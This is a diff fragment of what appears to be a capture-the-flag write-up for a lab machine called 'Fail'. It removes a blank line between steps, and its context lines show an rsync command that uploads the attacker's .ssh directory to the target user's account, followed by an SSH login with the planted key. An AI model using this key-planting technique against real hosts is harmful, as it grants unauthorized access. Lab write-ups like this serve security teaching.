@@ -112,7 +112,6 @@ rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
 ~~~
 
 5. SSH into the target machine
-
 ~~~
 ┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
 └─$ ssh -i ./id_rsa fox@192.168.194.126
